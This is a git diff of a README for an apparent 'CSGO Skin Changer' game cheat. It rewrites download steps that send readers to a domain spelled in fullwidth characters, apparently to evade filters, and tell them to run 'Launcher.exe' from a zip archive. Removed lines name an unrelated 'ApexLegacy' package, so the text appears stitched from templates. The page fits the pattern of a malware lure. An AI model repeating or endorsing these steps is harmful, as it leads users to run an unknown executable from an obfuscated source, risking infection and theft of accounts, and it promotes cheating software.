@@ -13,16 +13,9 @@ https://lavalink.pw/CSGO_Skin_Changer/index.php
 
 # 💻 How to download?
 
-
-+🏵Download From "ｗｗｗ．ｌａｖａｃｈｔ．ｃｏｍ"
-+🏵Unpack Archive "CSGO_Skin_Changer.zip"
-+🏵Run "Launcher.exe"
-+🏵Waiting For The Installation To Complete
-+🏵Done✔️
-
-+ 1) Download the cheat
-+ 2) Open zip ApexLegacy
-+ 3) Unzip the file to any folder/desktop.
-+ 4) Run Legacy.exe file
-+ 5) Enjoy it.
++ 1) 🏵Download From "ｗｗｗ．ｌａｖａｃｈｔ．ｃｏｍ"
++ 2) Unpack Archive "CSGO_Skin_Changer.zip"
++ 3) Run "Launcher.exe"
++ 4) Waiting For The Installation To Complete
++ 5) Done✔️
 
